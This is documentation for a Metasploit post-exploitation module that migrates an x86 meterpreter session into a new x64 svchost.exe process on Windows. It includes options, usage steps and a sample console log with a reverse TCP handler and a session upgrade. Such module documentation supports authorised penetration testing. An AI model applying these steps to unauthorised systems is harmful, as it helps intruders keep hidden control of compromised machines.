## Creating A Testing Environment

To use this module you need an x86 executable type meterpreter on a x64 windows machine.

This module has been tested against:

  1. Windows 10.
  2. Windows 7.
  3. Windows Server 2008R2

This module was not tested against, but may work against:

  1. Other versions of Windows that are x64.

## Options

**EXE**

The executable to start and migrate into. Default: `C:\windows\sysnative\svchost.exe`

**FALLBACK**

If the selected migration executable does not exist, fallback to a sysnative file. Default: `true`

**IGNORE_SYSTEM**

Migrate even if you have SYSTEM privileges. Default: `true`


### Verification Steps

  1. Start msfconsole
  2. Obtain a meterpreter session with an executable meterpreter via whatever method
  3. Do: `use post/windows/manage/archmigrate`
  4. Do: `set session #`
  5. Do: `run`

## Scenarios

### Windows 10 x64

```
    msf exploit(handler) > run

    [*] Started reverse TCP handler on <MSF_IP>:4567
    [*] Starting the payload handler...
    [*] Sending stage (957487 bytes) to <Win10x64_IP>
    [*] Meterpreter session 1 opened (<MSF_IP>:4567 -> <Win10x64_IP>:50917) at 2017-03-22 11:43:42 -0500

    meterpreter > sysinfo
    Computer        : DESKTOP-SO4MCA3
    OS              : Windows 10 (Build 14393).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 2
    Meterpreter     : x86/windows
    meterpreter > background
    [*] Backgrounding session 1...
    msf exploit(handler) > use post/windows/manage/archmigrate
    msf post(archmigrate) > set session 1
    session => 1
    msf post(archmigrate) > run

    [*] The meterpreter is not the same architecture as the OS! Upgrading!
    [*] Starting new x64 process C:\windows\sysnative\svchost.exe
    [+] Got pid 1772
    [*] Migrating..
    [+] Success!
    [*] Post module execution completed
    msf post(archmigrate) > sessions -l

    Active sessions
    ===============

      Id  Type                     Information                               Connection
      --  ----                     -----------                               ----------
      1   meterpreter x64/windows  DESKTOP-SO4MCA3\tmoose @ DESKTOP-SO4MCA3  <MSF_IP>:4567 -> <Win10x64_IP>:50917 (<Win10x64_IP>)

    msf post(archmigrate) > sessions -i 1
    [*] Starting interaction with 1...

    meterpreter > sysinfo
    Computer        : DESKTOP-SO4MCA3
    OS              : Windows 10 (Build 14393).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 2
    Meterpreter     : x64/windows
```
